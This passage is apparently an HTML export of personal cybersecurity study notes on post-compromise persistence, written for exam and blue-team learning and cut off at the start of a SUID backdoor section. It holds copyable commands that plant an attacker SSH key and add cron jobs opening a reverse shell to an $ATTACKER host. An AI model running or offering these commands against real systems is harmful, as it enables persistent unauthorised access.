@@ -1,0 +1,1578 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2026-07-20 Mon 14:09 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Persistence</title>
+<meta name="author" content="termux" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="style.css" type="text/css"/>
+<style type='text/css'>
+<!--/*--><![CDATA[/*><!--*/
+/* nice-org-html.css
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+*/
+
+/* basic layout ***************************************************************/
+*,
+*::before,
+*::after {
+    box-sizing: border-box;
+}
+html {
+    font-family: Sans;
+    line-height: 1.3;
+    font-size: calc(15px + 0.390625vw);
+    -webkit-text-size-adjust: 100%;
+}
+
+body {
+    background: #999; /* overwritten with theme --bg */
+    width: 100%;
+    min-height: 100vh;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family:
+	-apple-system,
+	BlinkMacSystemFont,
+	segoe ui,
+	Roboto,
+	Oxygen,
+	Ubuntu,
+	Cantarell,
+	open sans,
+	helvetica neue,
+	sans-serif,
+	system-ui
+}
+
+#preamble,
+#postamble {
+    width: 100%;
+}
+
+#content {
+    width: 80%;
+    max-width: 80ch;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    flex: 1;
+}
+
+/* custom facing **************************************************************/
+/* The variable values are injected by CSS pre-processing in et-org-html.el */
+:root {
+    --bc-tb: #000000;
+    --bc-block: #595959;
+    --clr: #000000;
+    --clr-tb-hd: #000000;
+    --clr-code: #000000;
+    --bg: #fbf7f0;
+    --bg-code: #cab9b2;
+    --bg-tb-hd: #cab9b2;
+    --bg-block: #efe9dd;
+    --clr-link: #531ab6;
+    --clr-title: #000000;
+    --clr-todo: #00598b;
+    --bg-todo: initial;
+    --clr-done: #7f0000;
+    --bg-done: initial;
+    --ts-clr: #0031a9;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #0031a9;
+    --bg-constant: initial;
+    --clr-constant: #531ab6;
+    --bg-comment: initial;
+    --clr-comment: #7f0000;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #7f0000;
+    --bg-function: initial;
+    --clr-function: #602938;
+    --bg-variable: initial;
+    --clr-variable: #00603f;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #894000;
+    --bg-doc: initial;
+    --clr-doc: #304463;
+    --bg-builtin: initial;
+    --clr-builtin: #721045;
+    --bg-string: initial;
+    --clr-string: #00598b;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+body[data-mode='light'] {
+    background: var(--bg);
+    color: var(--clr);
+}
+
+body[data-mode='dark'] {
+    background: var(--bg);
+    color: var(--clr);
+    --bc-tb: #ffffff;
+    --bc-block: #989898;
+    --clr: #ffffff;
+    --clr-code: #ffffff;
+    --clr-tb-hd: #ffffff;
+    --bg: #0d0e1c;
+    --bg-tb-hd: #484d67;
+    --bg-code: #484d67;
+    --bg-block: #1d2235;
+    --clr-link: #b6a0ff;
+    --clr-title: #ffffff;
+    --clr-todo: #2fafff;
+    --bg-todo: initial;
+    --clr-done: #ef8386;
+    --bg-done: initial;
+    --ts-clr: #79a8ff;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #79a8ff;
+    --bg-constant: initial;
+    --clr-constant: #b6a0ff;
+    --bg-comment: initial;
+    --clr-comment: #ef8386;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #ef8386;
+    --bg-function: initial;
+    --clr-function: #f78fe7;
+    --bg-variable: initial;
+    --clr-variable: #4ae2f0;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #ff7f86;
+    --bg-doc: initial;
+    --clr-doc: #9ac8e0;
+    --bg-builtin: initial;
+    --clr-builtin: #feacd0;
+    --bg-string: initial;
+    --clr-string: #2fafff;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+/* exceptions for badly rendering themes **************************************/
+body[data-theme='leuven'],
+body[data-theme='leuven-dark'] {
+    --bg-code: var(--bg-block);
+}
+
+/* ootb page layout ***********************************************************/
+#view-controls {
+    position: sticky;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background: var(--bg);
+    color: var(--clr-code);
+    height: 2.5rem;
+    padding-top: 1.25rem;
+    padding-bottom: 1.25rem;
+    z-index: 100;
+    border-radius: 5px; /* Rounded corners */
+}
+#toggle-mode {
+    position: absolute;
+    right: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#goto-top {
+    display: none;
+}
+#goto-top[data-show="true"] {
+    position: relative;
+    display: block;
+    text-align: center;
+    font-size: 1rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#toggle-toc {
+    display: none;
+}
+#toggle-toc[data-show="true"] {
+    position: absolute;
+    left: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+
+#toggle-toc:hover,
+#goto-top:hover,
+#toggle-mode:hover {
+    cursor: pointer;
+}
+
+#table-of-contents {
+    display: none;
+}
+#table-of-contents[data-show="true"] {
+    width: 80%;
+    max-width: 80rem;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    background: var(--bg);
+    scrollbar-width: none;
+    -ms-overflow-style: none;
+}
+
+#table-of-contents::-webkit-scrollbar {
+    display: none;
+}
+
+body[data-toc="true"] #content * {
+    display: none;
+}
+body[data-toc="true"] #content #table-of-contents,
+body[data-toc="true"] #content #table-of-contents * {
+    display: block;
+}
+
+
+/* misc elements **************************************************************/
+
+hr {
+    height: 0;
+    color: inherit;
+}
+
+b,
+strong {
+    font-weight: bolder;
+}
+
+code,
+kbd,
+samp,
+pre {
+    font-family:
+	Menlo,
+	ui-monospace,
+	SFMono-Regular,
+	Consolas,
+	'Liberation Mono',
+	monospace;
+}
+
+small {
+    font-size: 80%;
+}
+
+sub,
+sup {
+    font-size: 75%;
+    line-height: 0;
+    position: relative;
+    vertical-align: baseline;
+}
+
+sub {
+    bottom: -0.25em;
+}
+
+sup {
+    top: -0.5em;
+}
+
+table {
+    text-indent: 0;
+    border-color: inherit;
+}
+
+summary {
+    display: list-item;
+}
+
+h1 {
+    color: var(--clr-title);
+    text-align: center;
+}
+h2 {
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+}
+
+code {
+    color: var(--clr-code);
+    background: var(--bg-code);
+    border-radius: 2px;
+    padding-left: 5px;
+    padding-right: 5px;
+}
+
+pre::-webkit-scrollbar {
+    display: none;
+}
+
+.todo {
+    color: var(--clr-todo);
+    background: var(--bg-todo);
+}
+
+.done {
+    color: var(--clr-done);
+    background: var(--bg-done);
+}
+
+.timestamp-wrapper {
+    font-size: 0.8rem;
+    color: var(--clr-ts);
+}
+
+table {
+    width: 100%;
+    border: 2px solid var(--bc-tb);
+}
+
+thead {
+    color: var(--clr-tb-hd);
+    background: var(--bg-tb-hd);
+}
+
+td, th {
+    border: thin solid var(--bc-tb);
+}
+
+li {
+    margin-top: 0.5rem;
+    margin-bottom: 0.5rem;
+}
+#text-table-of-contents li a:before {
+    content: "• "
+}
+
+a {
+    text-decoration: none;
+    color: var(--clr-link);
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.MathJax_Display {
+    font-size: 1.25em;
+}
+
+img {
+    max-width: 100%;
+}
+
+pre {
+    padding: 1rem;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-block);
+    font-size: 0.9rem;
+    overflow-x: auto;
+    -ms-overflow-style: none;
+    scrollbar-width: thin;
+}
+
+.org-src-wrapper {
+    position: relative;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+}
+
+.org-src-bar {
+    position: relative;
+    top: 0rem;
+    width: 100%;
+    background: var(--bg-code);
+    border-radius: 0.5rem;
+    text-align: right;
+    min-height: 1rem;
+}
+
+.org-src-wrapper .org-src-container {
+    position: relative;
+    border: none;
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+    z-index: 0;
+}
+
+.org-src-wrapper .org-src-container pre.src {
+    border: none !important;
+    background: var(--bg-code) !important;
+    padding-top: 0rem;
+    padding-bottom: 0rem;
+    margin-top: 0rem;
+    margin-bottom: 0rem;
+    padding-bottom: 1.6rem;
+}
+
+.org-src-wrapper .org-src-bar .srcLangLabel {
+    top: 0rem;
+    right: 1.6rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    font-size: 0.8rem;
+    opacity: 0.5;
+    z-index: 1;
+    display: none;
+}
+
+.org-src-wrapper .org-src-bar .copyBtn {
+    top: 0rem;
+    right: 0.1rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-right: 0.7rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 0.8rem;
+    cursor: pointer;
+    opacity: 0.5;
+    z-index: 1;
+    transition: opacity 0.3s;
+}
+
+.org-src-wrapper .copyBtn:hover {
+    opacity: 1;
+}
+
+.org-src-wrapper .copyBtn i {
+    margin-right: 0.5rem;
+    padding: 0.5rem;
+}
+
+.admonition {
+    margin: 0.2rem;
+    color: inherit;
+    border-left: .25rem solid;
+}
+.admonition-title {
+    margin: 0 0 0.5rem 0.5rem;
+    padding: 0.5rem 0 0 0;
+    display: flex;
+    align-items: center;
+}
+.admonition-content > p {
+    margin: 0.5rem 0 0 0.5rem;
+    padding: 0 0 0.5rem 0;
+}
+
+.admonition.note {
+    border-left-color: var(--clr-note);
+}
+.admonition-title.note {
+    color: var(--clr-note);
+}
+.admonition-title.note:before {
+    content: '';
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-note);
+    mask-size: cover;    
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path class="admonition-icon-note" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+.admonition-icon-note {
+    fill: var(--clr-note);
+}
+
+.admonition.tip {
+    border-left-color: var(--clr-tip);
+}
+.admonition-title.tip {
+    color: var(--clr-tip);
+}
+.admonition-title.tip:before {
+    content: '';
+    fill: var(--clr-tip);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-tip);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>');    
+}
+
+.admonition.important {
+    border-left-color: var(--clr-important);
+}
+.admonition-title.important {
+    color: var(--clr-important);
+}
+.admonition-title.important:before {
+    content: '';
+    fill: var(--clr-important);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-important);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25Zm7 2.25v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');    
+}
+
+.admonition.warning {
+    border-left-color: var(--clr-warning);
+}
+.admonition-title.warning {
+    color: var(--clr-warning);
+}
+.admonition-title.warning:before {
+    content: '';
+    color: var(--clr-warning);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-warning);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');
+}
+
+
+.admonition.caution {
+    border-left-color: var(--clr-caution);
+}
+.admonition-title.caution {
+    color: var(--clr-caution);
+}
+.admonition-title.caution:before {
+    content: '';
+    fill: var(--clr-caution);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-caution);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M4.47.22A.749.749 0 0 1 5 0h6c.199 0 .389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749 0 0 1-.22.53l-4.25 4.25A.749.749 0 0 1 11 16H5a.749.749 0 0 1-.53-.22L.22 11.53A.749.749 0 0 1 0 11V5c0-.199.079-.389.22-.53Zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5ZM8 4a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 4Zm0 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+/* responsive layouts *********************************************************/
+
+@media only screen and (max-width: 768px) {
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+@media only screen and (max-width: 480px) {
+    #view-controls {
+	padding-top: 1.5em;
+	padding-bottom: 1.5em;
+    }
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+
+/* generated header and footer ************************************************/
+
+#generated-header,
+#generated-footer {
+    width: 90%;
+    margin-left: 5%;
+    margin-right: 5%;
+    line-height: 1;
+}
+.generated header {
+    top: 0;
+    left: 0;
+}
+.generated footer {
+    bottom: 0;
+    left: 0;
+}
+.generated header a,
+.generated footer a {
+    display: inline;
+    color: var(--clr-title);
+    text-decoration: none;
+    transition: color .15s ease-in;
+}
+.generated header a:hover,
+.generated footer a:hover {
+    color: var(--clr-link);
+}
+
+.generated header nav {
+    position: relative;
+    margin-top: 1rem;
+    top: 0;
+    left: 0;
+}
+.generated footer nav {
+    position: relative;
+    bottom: 0;
+    left: 0;
+}
+
+.generated .separator {
+    display: block;
+    width: 111%;
+    margin-left: -5.5%;
+    max-width: 100vw;
+    height: 0.125rem;
+    background: var(--bg-code);
+}
+
+.generated a .nav-title,
+.generated a .nav-author {
+    display: inline;
+    margin-top: 1rem;
+    margin-bottom: 1rem;
+    padding-right: 10rem;
+}
+
+.generated .nav-title {
+    letter-spacing: .075rem;
+    font-weight: 500;
+}
+
+.generated .nav-toggle {
+    display: none;
+}
+.generated .nav-button {
+    display: none;
+}
+.generated .nav-list {
+    overflow-y: hidden;
+    display: block;
+    float: right;
+    list-style: none;
+    margin-bottom: 0;
+    margin-top: 0;
+}
+
+.generated .nav-item {
+    position: relative;
+    float: left;
+    margin: 0;
+}
+.generated .nav-link {
+    position: relative;
+    float: right;
+    margin-left: 2rem;
+    margin-right: 0rem;
+}
+
+.generated .nav-toggle {
+    max-height: 0;
+    visibility: hidden;
+    overflow-y: hidden;
+}
+
+.generated header .separator {
+    margin-top: 1rem;
+    margin-bottom: 0;
+}
+
+.generated footer .separator {
+    margin-bottom: 1rem;
+    margin-top: 0;
+}
+
+.generated .menu-sep {
+    display: none;
+    max-height: 0;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+
+.generated footer {
+    padding-bottom: 1rem;
+}
+
+.generated.compact footer {
+    padding-bottom: 0;
+}
+
+.generated.compact header .separator {
+    margin-top: 0;
+    margin-bottom:0;
+}
+.generated.compact footer .separator {
+    margin-bottom: 1rem;
+}
+
+.generated.compact .nav-toggle {
+    visibility: visible;
+}
+
+.generated.compact .nav-toggle + label span::before {
+    transition: all 0.2s ease-in;
+}
+.generated.compact .nav-toggle:checked + label span::before {
+    transform: translateX(0.04rem) translateY(-0.25rem) rotate(90deg);
+    transition: all 0.2s ease;
+}
+
+.generated.compact .menu-sep {
+    display: flex;
+    max-height: 0rem;
+}
+.generated.compact .nav-toggle:checked + label + .menu-sep {
+    display: block;
+    position: relative;
+    max-height: 1rem;
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-list {
+    float: none !important;
+    position: relative;
+    display: block;
+    padding-left: 0;
+    padding-right: 0;
+    z-index: 5;
+    width: 100%;
+    height: auto;
+    max-height: 0;
+    margin: 0;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+.generated.compact .nav-toggle:checked + label ~ .nav-list {
+    display: block;
+    max-height: 100rem;
+    overflow-y: hidden;
+}
+.generated.compact header .nav-toggle:checked + label ~ .nav-list {
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-button {
+    display: inline;
+    position: relative;
+    float: right;
+    font-size: 1rem;
+}
+.generated.compact .nav-button span::before {
+    display: inline-block;
+    content: '\2807';
+    font-size: 2rem;
+    transform: translateX(0.25rem) translateY(-0.5rem);
+}
+
+.generated.compact .nav-item {
+    float: none !important;
+    text-align: center !important;
+}
+.generated.compact .nav-link {
+    line-height: 2rem;
+    margin-left: 2rem;
+    margin-right: 2rem;
+    float: none !important;
+}
+
+.generated.compact footer .separator.menu-sep {
+    margin-bottom: -1rem;
+}
+
+.hidden {
+    display: none;
+}
+
+.collapsible:hover {
+    cursor: pointer;
+}
+
+.collapsible.collapsed::after {
+    display: inline-block;
+    content: '...';
+}
+/*]]>*/-->
+</style>
+</head>
+<body>
+<div id="preamble" class="status">
+<div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
+</div>
+<div id="content" class="content">
+<h1 class="title">Persistence</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgb17baca">1. Linux Persistence</a>
+<ul>
+<li><a href="#org5646cc7">SSH Authorised Keys</a></li>
+<li><a href="#org8d4ca2a">Cron Job</a></li>
+<li><a href="#org9227e5d">SUID Backdoor (requires root)</a></li>
+<li><a href="#org6098cf3">Bash RC / Profile</a></li>
+<li><a href="#org2482bbe">Systemd Service (requires root)</a></li>
+<li><a href="#orged0a3b5">/etc/passwd Backdoor</a></li>
+</ul>
+</li>
+<li><a href="#orgae00901">2. Windows Persistence</a>
+<ul>
+<li><a href="#org4b12339">Registry Run Keys</a></li>
+<li><a href="#org746f1f3">Scheduled Task</a></li>
+<li><a href="#orgc28ca4d">New Local Admin User</a></li>
+<li><a href="#org817ec0a">Windows Service</a></li>
+<li><a href="#orgc3552a5">Startup Folder</a></li>
+<li><a href="#org6f729a4">Golden Ticket (AD — post DCSync)</a></li>
+</ul>
+</li>
+<li><a href="#org1d2e09e">3. Payload Generation</a></li>
+<li><a href="#orgd81e2ea">Tips</a></li>
+</ul>
+</div>
+</div>
+<p>
+Maintaining access to a compromised system after the initial
+exploit path is closed — service restarts, password resets, or
+patch deployment. In CTFs persistence is rarely required but
+knowing the mechanisms is expected knowledge for the exam and
+for understanding attacker tradecraft in blue team scenarios.
+</p>
+
+<p>
+Related: <a href="../org/20260214T085940--post-exploitation__concept_cybersecurity.html">Post Exploitation</a>
+         <a href="../org/20260314T005718--linux-privilege-escalation__concept_cybersecurity.html">Linux Privilege Escalation</a>
+         <a href="../org/20260314T005758--windows-privilege-escalation__concept_cybersecurity.html">Windows Privilege Escalation</a>
+         <a href="../org/20260206T060726--reverse-shell__concept_cybersecurity.html">Reverse Shell</a>
+         <a href="../org/20260314T005736--msfvenom__cybersecurity_tool.html">Msfvenom</a>
+</p>
+<div id="outline-container-orgb17baca" class="outline-2">
+<h2 id="orgb17baca">1. Linux Persistence</h2>
+<div class="outline-text-2" id="text-orgb17baca">
+</div>
+<div id="outline-container-org5646cc7" class="outline-3">
+<h3 id="org5646cc7">SSH Authorised Keys</h3>
+<div class="outline-text-3" id="text-org5646cc7">
+<p>
+Silently add attacker public key — survives reboots, no password
+needed, hard to detect without auditing authorised<sub>keys</sub> files.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_20b5a96cd1ae484ca89c939d2daf12d7>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_20b5a96cd1ae484ca89c939d2daf12d7=document.querySelector('button[name=btn_20b5a96cd1ae484ca89c939d2daf12d7]');
+copyBtnbtn_20b5a96cd1ae484ca89c939d2daf12d7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Generate key pair on attacker\nssh-keygen -t rsa -b 4096 -f backdoor -N \"\"\n\n# Add public key to target\necho \"$(cat backdoor.pub)\" >> /home/user/.ssh/authorized_keys\n# or for root\necho \"$(cat backdoor.pub)\" >> /root/.ssh/authorized_keys\n\n# Connect back\nssh -i backdoor user@$TARGET\n`);copyBtnbtn_20b5a96cd1ae484ca89c939d2daf12d7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_20b5a96cd1ae484ca89c939d2daf12d7.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Generate key pair on attacker
+</span>ssh-keygen -t rsa -b 4096 -f backdoor -N <span style="color: var(--clr-string); background-color: var(--bg-string);">""</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Add public key to target
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"$(cat backdoor.pub)"</span> &gt;&gt; /home/user/.ssh/authorized_keys
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">or for root
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"$(cat backdoor.pub)"</span> &gt;&gt; /root/.ssh/authorized_keys
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Connect back
+</span>ssh -i backdoor user@$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">TARGET</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org8d4ca2a" class="outline-3">
+<h3 id="org8d4ca2a">Cron Job</h3>
+<div class="outline-text-3" id="text-org8d4ca2a">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7c8e67c0e9b248c28fdba0db7d0fa08a>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_7c8e67c0e9b248c28fdba0db7d0fa08a=document.querySelector('button[name=btn_7c8e67c0e9b248c28fdba0db7d0fa08a]');
+copyBtnbtn_7c8e67c0e9b248c28fdba0db7d0fa08a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Add reverse shell to crontab — runs every minute\n(crontab -l 2>/dev/null; echo \"* * * * * bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\") | crontab -\n\n# System-wide cron (requires root)\necho \"* * * * * root bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\" >> /etc/crontab\n\n# Drop script in cron directory\necho '#!/bin/bash' > /etc/cron.d/backdoor\necho \"* * * * * root /tmp/.backdoor\" >> /etc/cron.d/backdoor\n`);copyBtnbtn_7c8e67c0e9b248c28fdba0db7d0fa08a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7c8e67c0e9b248c28fdba0db7d0fa08a.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Add reverse shell to crontab &#8212; runs every minute
+</span>(crontab -l 2&gt;/dev/null; <span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"* * * * * bash -c 'bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1'"</span>) | crontab -
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">System-wide cron (requires root)
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"* * * * * root bash -c 'bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1'"</span> &gt;&gt; /etc/crontab
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Drop script in cron directory
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'#!/bin/bash'</span> &gt; /etc/cron.d/backdoor
+<span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"* * * * * root /tmp/.backdoor"</span> &gt;&gt; /etc/cron.d/backdoor
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org9227e5d" class="outline-3">
+<h3 id="org9227e5d">SUID Backdoor (requires root)</h3>
+<div class="outline-text-3" id="text-org9227e5d">
+<div class='org-src-wrapper'>
